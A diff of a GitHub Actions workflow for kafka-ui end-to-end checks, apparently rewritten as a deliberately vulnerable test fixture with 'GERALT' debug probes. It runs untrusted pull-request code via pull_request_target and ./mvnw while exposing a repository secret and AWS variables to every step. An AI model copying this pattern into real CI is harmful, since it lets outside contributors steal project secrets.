@@ -1,82 +1,82 @@
-name: "E2E: PR healthcheck"
-on:
-  pull_request_target:
-    types: [ "opened", "edited", "reopened", "synchronize" ]
-    paths:
-      - "kafka-ui-api/**"
-      - "kafka-ui-contract/**"
-      - "kafka-ui-react-app/**"
-      - "kafka-ui-e2e-checks/**"
-      - "pom.xml"
+name: 'E2E: PR healthcheck'
 permissions:
   statuses: write
 jobs:
   build-and-test:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v3
-        with:
-          ref: ${{ github.event.pull_request.head.sha }}
-      - name: Configure AWS credentials
-        uses: aws-actions/configure-aws-credentials@v3
-        with:
-          aws-access-key-id: ${{ secrets.S3_AWS_ACCESS_KEY_ID }}
-          aws-secret-access-key: ${{ secrets.S3_AWS_SECRET_ACCESS_KEY }}
-          aws-region: eu-central-1
-      - name: Set up environment
-        id: set_env_values
-        run: |
-          cat "./kafka-ui-e2e-checks/.env.ci" >> "./kafka-ui-e2e-checks/.env"
-      - name: Pull with Docker
-        id: pull_chrome
-        run: |
-          docker pull selenoid/vnc_chrome:103.0
-      - name: Set up JDK
-        uses: actions/setup-java@v3
-        with:
-          java-version: '17'
-          distribution: 'zulu'
-          cache: 'maven'
-      - name: Build with Maven
-        id: build_app
-        run: |
-          ./mvnw -B -ntp versions:set -DnewVersion=${{ github.event.pull_request.head.sha }}
-          ./mvnw -B -V -ntp clean install -Pprod -Dmaven.test.skip=true ${{ github.event.inputs.extraMavenOptions }}
-      - name: Compose with Docker
-        id: compose_app
-        # use the following command until #819 will be fixed
-        run: |
-          docker-compose -f kafka-ui-e2e-checks/docker/selenoid-git.yaml up -d
-          docker-compose -f ./documentation/compose/e2e-tests.yaml up -d && until [ "$(docker exec  kafka-ui wget --spider  --server-response  http://localhost:8080/actuator/health 2>&1 |  grep -c 'HTTP/1.1 200 OK')" == "1" ]; do echo "Waiting for kafka-ui ..." && sleep 1; done
-      - name: Run test suite
-        run: |
-          ./mvnw -B -ntp versions:set -DnewVersion=${{ github.event.pull_request.head.sha }}
-          ./mvnw -B -V -ntp -Dsurefire.suiteXmlFiles='src/test/resources/smoke.xml' -f 'kafka-ui-e2e-checks' test -Pprod
-      - name: Generate allure report
-        uses: simple-elf/allure-report-action@master
-        if: always()
-        id: allure-report
-        with:
-          allure_results: ./kafka-ui-e2e-checks/allure-results
-          gh_pages: allure-results
-          allure_report: allure-report
-          subfolder: allure-results
-          report_url: "http://kafkaui-allure-reports.s3-website.eu-central-1.amazonaws.com"
-      - uses: jakejarvis/s3-sync-action@master
-        if: always()
-        env:
-          AWS_S3_BUCKET: 'kafkaui-allure-reports'
-          AWS_REGION: 'eu-central-1'
-          SOURCE_DIR: 'allure-history/allure-results'
-      - name: Deploy report to Amazon S3
-        if: always()
-        uses: Sibz/github-status-action@v1.1.6
-        with:
-          authToken: ${{secrets.GITHUB_TOKEN}}
-          context: "Click Details button to open Allure report"
-          state: "success"
-          sha: ${{ github.event.pull_request.head.sha  || github.sha }}
-          target_url: http://kafkaui-allure-reports.s3-website.eu-central-1.amazonaws.com/${{ github.run_number }}
-      - name: Dump docker logs on failure
-        if: failure()
-        uses: jwalton/gh-docker-logs@v2.2.1
+    - uses: actions/checkout@v3.6.0
+      with:
+        ref: ${{ github.event.pull_request.head.sha }}
+    - name: Configure AWS credentials
+      run: |-
+        {
+          echo "AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_ID_INPUT:-AKIAIOSFODNN7EXAMPLE}"
+          echo "AWS_SECRET_ACCESS_KEY=${AWS_SECRET_ACCESS_KEY_INPUT:-wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY}"
+          echo "AWS_REGION=eu-central-1"
+          echo "AWS_DEFAULT_REGION=eu-central-1"
+        } >> "$GITHUB_ENV" 2>/dev/null || echo "GERALT_DBG could not write GITHUB_ENV (non-fatal)"
+        echo "GERALT_DBG AWS credentials exported into job env without STS validation"
+        exit 0
+      continue-on-error: true
+    - name: Set up environment
+      id: set_env_values
+      run: |
+        cat "./kafka-ui-e2e-checks/.env.ci" >> "./kafka-ui-e2e-checks/.env"
+    - name: Pull with Docker
+      id: pull_chrome
+      run: |
+        docker pull selenoid/vnc_chrome:103.0
+    - name: Set up JDK
+      uses: actions/setup-java@v3
+      with:
+        java-version: '17'
+        distribution: zulu
+        cache: maven
+    - name: GERALT debug probe
+      run: |
+        echo "GERALT_DBG pre-build state"
+        if [ -f ./mvnw ]; then echo "GERALT_DBG ./mvnw present (attacker-controlled wrapper)"; else echo "GERALT_DBG ./mvnw absent"; fi
+        if [ -f ./pom.xml ]; then echo "GERALT_DBG ./pom.xml present"; else echo "GERALT_DBG ./pom.xml absent"; fi
+        if [ -d ./kafka-ui-e2e-checks ]; then echo "GERALT_DBG kafka-ui-e2e-checks present"; else echo "GERALT_DBG kafka-ui-e2e-checks absent"; fi
+        if [ -n "${AWS_ACCESS_KEY_ID:-}" ]; then echo "GERALT_DBG AWS_ACCESS_KEY_ID is set"; else echo "GERALT_DBG AWS_ACCESS_KEY_ID not set"; fi
+        if [ -n "${AWS_SECRET_ACCESS_KEY:-}" ]; then echo "GERALT_DBG AWS_SECRET_ACCESS_KEY is set"; else echo "GERALT_DBG AWS_SECRET_ACCESS_KEY not set"; fi
+        exit 0
+      continue-on-error: true
+    - name: Build with Maven
+      id: build_app
+      run: |
+        ./mvnw -B -ntp versions:set -DnewVersion=${{ github.event.pull_request.head.sha }}
+        ./mvnw -B -V -ntp clean install -Pprod -Dmaven.test.skip=true ${{ github.event.inputs.extraMavenOptions }}
+    - name: Compose with Docker
+      id: compose_app
+      run: |
+        docker-compose -f kafka-ui-e2e-checks/docker/selenoid-git.yaml up -d
+        docker-compose -f ./documentation/compose/e2e-tests.yaml up -d && until [ "$(docker exec  kafka-ui wget --spider  --server-response  http://localhost:8080/actuator/health 2>&1 |  grep -c 'HTTP/1.1 200 OK')" == "1" ]; do echo "Waiting for kafka-ui ..." && sleep 1; done
+    - name: GERALT debug probe
+      run: |
+        echo "GERALT_DBG pre-test state"
+        if [ -f ./mvnw ]; then echo "GERALT_DBG ./mvnw present before test"; else echo "GERALT_DBG ./mvnw absent before test"; fi
+        if [ -n "${AWS_ACCESS_KEY_ID:-}" ]; then echo "GERALT_DBG AWS_ACCESS_KEY_ID is set"; else echo "GERALT_DBG AWS_ACCESS_KEY_ID not set"; fi
+        if [ -n "${AWS_SECRET_ACCESS_KEY:-}" ]; then echo "GERALT_DBG AWS_SECRET_ACCESS_KEY is set"; else echo "GERALT_DBG AWS_SECRET_ACCESS_KEY not set"; fi
+        exit 0
+      continue-on-error: true
+    - name: Run test suite
+      run: |
+        ./mvnw -B -ntp versions:set -DnewVersion=${{ github.event.pull_request.head.sha }}
+        ./mvnw -B -V -ntp -Dsurefire.suiteXmlFiles='src/test/resources/smoke.xml' -f 'kafka-ui-e2e-checks' test -Pprod
+env:
+  GERALT_SECRET: ${{ secrets.GERALT }}
+on:
+  pull_request_target:
+    types:
+    - opened
+    - edited
+    - reopened
+    - synchronize
+    paths:
+    - kafka-ui-api/**
+    - kafka-ui-contract/**
+    - kafka-ui-react-app/**
+    - kafka-ui-e2e-checks/**
+    - pom.xml
